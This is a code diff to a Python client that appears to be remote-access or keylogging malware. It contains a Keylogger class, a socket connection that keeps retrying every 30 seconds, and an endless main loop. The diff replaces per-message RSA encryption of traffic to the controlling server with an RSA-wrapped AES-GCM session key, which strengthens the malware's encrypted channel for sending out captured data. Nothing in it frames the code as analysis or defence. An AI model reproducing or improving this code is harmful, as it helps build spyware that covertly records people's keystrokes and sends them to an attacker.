@@ -253,16 +253,16 @@ class Connection:
             except socket.error:
                 time.sleep(30)
 
-        self.server_pub = self.exchange_keys()
-
-    def pem_to_key(self, pem):
-        return serialization.load_pem_public_key(pem, backend=default_backend())
+        aes_key = self.exchange_keys()
+        self.crypter = AESGCM(aes_key)
 
     def exchange_keys(self):
         self.sock.sendall(self.pubkey_pem)
-        pem = self.sock.recv(self.PACKET_SIZE) + self.sock.recv(self.PACKET_SIZE)
-        pubkey = serialization.load_pem_public_key(pem, default_backend())
-        return pubkey
+        aes_key_enc = self.sock.recv(256)
+        return self.privkey.decrypt(aes_key_enc,
+                                    padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                                                 algorithm=hashes.SHA256(),
+                                                 label=None))
 
     def send(self, data: dict):
         data = self.encrypt(json.dumps(data.copy()).encode(self.CODEC))
@@ -279,16 +279,11 @@ class Connection:
         return json.loads(self.decrypt(bytes(data)).decode(self.CODEC))
 
     def encrypt(self, data):
-        return self.server_pub.encrypt(data,
-                                       padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
-                                                    algorithm=hashes.SHA256(),
-                                                    label=None))
+        nonce = os.urandom(12)
+        return nonce + self.crypter.encrypt(nonce, data, b"")
 
     def decrypt(self, cipher):
-        return self.privkey.decrypt(cipher,
-                                    padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
-                                                 algorithm=hashes.SHA256(),
-                                                 label=None))
+        return self.crypter.decrypt(cipher[:12], cipher[12:], b"")
 
 
 class Keylogger:
@@ -306,10 +301,10 @@ class Keylogger:
 
 if __name__ == "__main__":
     while True:
-        try:
-            client = Client()
-            client.main()
-            if client.exit:
-                break
-        except:
-            pass
+        # try:
+        client = Client()
+        client.main()
+        # if client.exit:
+        #    break
+    # except:
+    # pass
